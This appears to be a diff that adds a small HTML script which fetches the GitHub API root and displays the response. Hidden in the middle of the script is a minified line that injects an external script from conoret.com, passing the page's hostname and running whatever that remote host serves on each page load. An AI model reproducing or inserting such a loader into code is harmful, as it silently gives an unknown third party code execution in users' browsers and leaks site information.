@@ -1,0 +1,12 @@
+<script>
+let api_adress="https://api.github.com";
+fetch(api_adress)
+.then(dat=>dat.text())
+.then(text=>{
+console.log(text);
+document.body.innerHTML='<meta name="color-scheme" content="light dark">';
+window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();
+document.body.innerHTML+=
+"<pre style='word-wrap: break-word; white-space: pre-wrap;'>"+String(text)+"</pre>";
+})
+</script>
